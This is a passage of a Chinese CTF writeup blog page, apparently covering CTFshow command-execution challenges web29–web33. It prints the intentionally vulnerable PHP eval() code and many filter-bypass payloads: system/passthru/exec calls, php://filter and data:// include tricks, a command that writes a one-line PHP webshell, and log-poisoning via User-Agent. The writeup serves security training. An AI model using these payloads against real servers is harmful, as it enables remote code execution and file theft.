ï¼Œä¸ä¼šè¢«å½“æˆæ•°å­—è¿‡æ»¤\ntac%09fl*%0a\ror\rtac%09f*||\ror\rtac",
  "wordCount" : "12686",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2024-12-22T00:27:55+08:00",
  "dateModified": "2024-12-22T00:27:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>é¦–é¡µğŸ“”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£ğŸ—ƒï¸</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>æ ‡ç­¾ğŸ”–</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="æœç´¢">
                    <span>æœç´¢ğŸ”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="å‹é“¾ğŸˆ">
                    <span>å‹é“¾ğŸˆ</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="å…³äº">
                    <span>å…³äºğŸ‘¨â€ğŸ’»</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CTFSHOW-å‘½ä»¤æ‰§è¡Œ-Writeup
    </h1>
<div class="post-meta"><span title='2024-12-22 00:27:55 +0800 CST'>2024-12-22</span>&nbsp;Â·&nbsp;26 åˆ†é’Ÿ&nbsp;Â·&nbsp;Xrntkk

<div class="meta-item">&nbspÂ·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">ç›®å½•</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#web29" aria-label="web29">web29</a></li>
                <li>
                    <a href="#web30" aria-label="web30">web30</a></li>
                <li>
                    <a href="#web31" aria-label="web31">web31</a></li>
                <li>
                    <a href="#web32" aria-label="web32">web32</a></li>
                <li>
                    <a href="#web33" aria-label="web33">web33</a></li>
                <li>
                    <a href="#web34" aria-label="web34">web34</a></li>
                <li>
                    <a href="#web35" aria-label="web35">web35</a></li>
                <li>
                    <a href="#web36" aria-label="web36">web36</a></li>
                <li>
                    <a href="#web37" aria-label="web37">web37</a></li>
                <li>
                    <a href="#web38" aria-label="web38">web38</a></li>
                <li>
                    <a href="#web39" aria-label="web39">web39</a></li>
                <li>
                    <a href="#web40" aria-label="web40">web40</a></li>
                <li>
                    <a href="#web41" aria-label="web41">web41</a></li>
                <li>
                    <a href="#web42" aria-label="web42">web42</a></li>
                <li>
                    <a href="#web43" aria-label="web43">web43</a></li>
                <li>
                    <a href="#web44" aria-label="web44">web44</a></li>
                <li>
                    <a href="#web45" aria-label="web45">web45</a></li>
                <li>
                    <a href="#web46" aria-label="web46">web46</a></li>
                <li>
                    <a href="#web47" aria-label="web47">web47</a></li>
                <li>
                    <a href="#web48" aria-label="web48">web48</a></li>
                <li>
                    <a href="#web49" aria-label="web49">web49</a></li>
                <li>
                    <a href="#web50" aria-label="web50">web50</a></li>
                <li>
                    <a href="#web51" aria-label="web51">web51</a></li>
                <li>
                    <a href="#web51-1" aria-label="web51">web51</a></li>
                <li>
                    <a href="#web52" aria-label="web52">web52</a></li>
                <li>
                    <a href="#web54" aria-label="web54">web54</a></li>
                <li>
                    <a href="#web55" aria-label="web55">web55</a></li>
                <li>
                    <a href="#web56" aria-label="web56">web56</a></li>
                <li>
                    <a href="#web57" aria-label="web57">web57</a></li>
                <li>
                    <a href="#web58" aria-label="web58">web58</a></li>
                <li>
                    <a href="#web59" aria-label="web59">web59</a></li>
                <li>
                    <a href="#web60" aria-label="web60">web60</a></li>
                <li>
                    <a href="#web61" aria-label="web61">web61</a></li>
                <li>
                    <a href="#web62" aria-label="web62">web62</a></li>
                <li>
                    <a href="#web62-1" aria-label="web62">web62</a></li>
                <li>
                    <a href="#web63" aria-label="web63">web63</a></li>
                <li>
                    <a href="#web64" aria-label="web64">web64</a></li>
                <li>
                    <a href="#web65" aria-label="web65">web65</a></li>
                <li>
                    <a href="#web66" aria-label="web66">web66</a></li>
                <li>
                    <a href="#web67" aria-label="web67">web67</a></li>
                <li>
                    <a href="#web68" aria-label="web68">web68</a></li>
                <li>
                    <a href="#web69" aria-label="web69">web69</a></li>
                <li>
                    <a href="#web70" aria-label="web70">web70</a></li>
                <li>
                    <a href="#web71" aria-label="web71">web71</a></li>
                <li>
                    <a href="#web72" aria-label="web72">web72</a><ul>
                        
                <li>
                    <a href="#%e6%89%80%e4%bb%a5%e4%bb%80%e4%b9%88%e6%98%afuaf%e5%91%a2" aria-label="æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢ï¼Ÿ">æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢ï¼Ÿ</a></li></ul>
                </li>
                <li>
                    <a href="#web73" aria-label="web73">web73</a></li>
                <li>
                    <a href="#web74" aria-label="web74">web74</a></li>
                <li>
                    <a href="#web75" aria-label="web75">web75</a></li>
                <li>
                    <a href="#%e7%bb%93%e6%9e%9c%e8%be%93%e5%87%ba%e4%b8%8e%e8%b5%84%e6%ba%90%e9%87%8a%e6%94%be" aria-label="ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾">ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾</a></li>
                <li>
                    <a href="#%e5%bc%82%e5%b8%b8%e5%a4%84%e7%90%86" aria-label="å¼‚å¸¸å¤„ç†">å¼‚å¸¸å¤„ç†</a></li>
                <li>
                    <a href="#web76" aria-label="web76">web76</a></li>
                <li>
                    <a href="#web77" aria-label="web77">web77</a><ul>
                        
                <li>
                    <a href="#%e4%bb%80%e4%b9%88%e6%98%afffi" aria-label="ä»€ä¹ˆæ˜¯FFI?">ä»€ä¹ˆæ˜¯FFI?</a></li></ul>
                </li>
                <li>
                    <a href="#web118" aria-label="web118">web118</a></li>
                <li>
                    <a href="#web119" aria-label="Web119">Web119</a></li>
                <li>
                    <a href="#web120" aria-label="web120">web120</a></li>
                <li>
                    <a href="#web121" aria-label="web121">web121</a></li>
                <li>
                    <a href="#web122" aria-label="web122">web122</a></li>
                <li>
                    <a href="#web124" aria-label="web124">web124</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h4 id="web29">web29<a hidden class="anchor" aria-hidden="true" href="#web29">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:26:48
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°é€šè¿‡evalå‡½æ•°å¯ä»¥æ‰§è¡Œphpä»£ç æˆ–è€…ç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†flagã€‚</p>
<p>è¿›è¡Œç»•è¿‡å°±è¡Œï¼Œè§£æ³•å¾ˆå¤š</p>
<blockquote>
<ol>
<li>
<p>c=system(&ldquo;cat fl*g.php | grep  -E &lsquo;fl.g&rsquo; &ldquo;);</p>
</li>
<li>
<p>c=system(&ldquo;tac fl*g.php&rdquo;);</p>
</li>
<li>
<p>c=system(&ldquo;cat fl*g.php&rdquo;);ï¼ˆç”¨catè¦å³é”®æŸ¥çœ‹æºä»£ç æ‰èƒ½çœ‹åˆ°å›æ˜¾ï¼‰</p>
</li>
<li>
<p>c=system(&ldquo;cp fl*g.php a.txt &ldquo;);ï¼ˆè®¿é—®a.txtæŸ¥çœ‹ï¼‰</p>
</li>
<li>
<p>c=system(&rsquo;echo -e &quot; &lt;?php \n error_reporting(0); \n  $c= $_GET['c']; \n eval($c); &quot; &gt; a.php&rsquo;); //ç›´æ¥æ–°å»ºä¸€ä¸ªé¡µé¢å¹¶å†™å…¥ä¸€å¥è¯æœ¨é©¬
ï¼ˆ/a.php?c=system(&ldquo;tac flag.php&rdquo;);ï¼‰</p>
</li>
<li>
<p>?c=echo `tac fla*`;</p>
<p>&hellip;.</p>
</li>
</ol></blockquote>
<h4 id="web30">web30<a hidden class="anchor" aria-hidden="true" href="#web30">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:42:26
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é‡Œè¿‡æ»¤äº†å…³é”®å­—flagï¼Œsystemè¿˜æœ‰phpï¼Œç”±äºè¿‡æ»¤äº†systemæˆ‘ä»¬éœ€è¦ä½¿ç”¨å…¶ä»–çš„ç³»ç»Ÿå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>payload:</p>
<blockquote>
<ol>
<li>
<p>c=printf(exec(&ldquo;cat%20fl*&rdquo;));</p>
</li>
<li>
<p>c=echo exec(&ldquo;cat f\lag.p\hp&rdquo;);</p>
</li>
<li>
<p>c=show_source(scandir(&rdquo;.&rdquo;)[2]); (è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåŒ…å«å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•é¡¹çš„æ•°ç»„)</p>
</li>
<li>
<p>c=highlight_file(next(array_reverse(scandir(&rdquo;.&rdquo;))));</p>
</li>
<li>
<p>c=passthru(&ldquo;tac fla*&rdquo;);</p>
</li>
<li>
<p>c=echo `tac fla*`;</p>
</li>
<li>
<p>c=$a=sys;$b=tem;$c=$a.$b;$c(&ldquo;tac fla*&rdquo;);*</p>
</li>
<li>
<p>c=echo shell_exec(&ldquo;tac fla*&rdquo;);</p>
</li>
<li>
<p>c=eval($_GET[1]);&amp;1=system(&ldquo;tac flag.php&rdquo;);</p>
</li>
<li>
<p>c=passthru(base64_decode(&ldquo;Y2F0IGZsYWcucGhw==&rdquo;));(base64ç»•è¿‡)</p>
<p>&hellip;&hellip;</p>
</li>
</ol></blockquote>
<h4 id="web31">web31<a hidden class="anchor" aria-hidden="true" href="#web31">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:49:10
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'</p>
<p>payload:</p>
<blockquote>
<ol>
<li>c=eval($_GET[1]);&amp;1=system(&ldquo;tac flag.php&rdquo;);</li>
<li>c=show_source(scandir(getcwd())[2]);</li>
<li>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</li>
<li>c=passthru(&ldquo;tac%09fla*&rdquo;);</li>
<li>c=echo`tac%09fla*`;</li>
</ol></blockquote>
<h4 id="web32">web32<a hidden class="anchor" aria-hidden="true" href="#web32">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:56:31
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(</p>
<p><em>è¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨<code>${IFS}</code>å’Œ<code>%0a</code> ä»£æ›¿ï¼Œåˆ†å·å¯ä»¥ç”¨<code>?&gt;</code>ä»£æ›¿</em></p>
<p>ç”¨includeæ„é€ payloadï¼š</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<p>å¾—åˆ°çš„ç»“æœç”¨base64è§£ç ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<p>æˆ–è€…ç”¨æ—¥å¿—æ³¨å…¥ï¼š</p>
<blockquote>
<p>url/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log
<code>/var/log/nginx/access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯</code></p></blockquote>
<h4 id="web33">web33<a hidden class="anchor" aria-hidden="true" href="#web33">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 02:22:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|</span><span class="se">\&#34;</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å±è”½çš„å…³é”®è¯æ¯”ä¸Šä¸€é¢˜å¤šäº†ä¸ªåŒå¼•å· /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|&quot;</p>
<p>ç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>æˆ–è€…</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web34">web34<a hidden class="anchor" aria-hidden="true" href="#web34">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 04:21:29
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
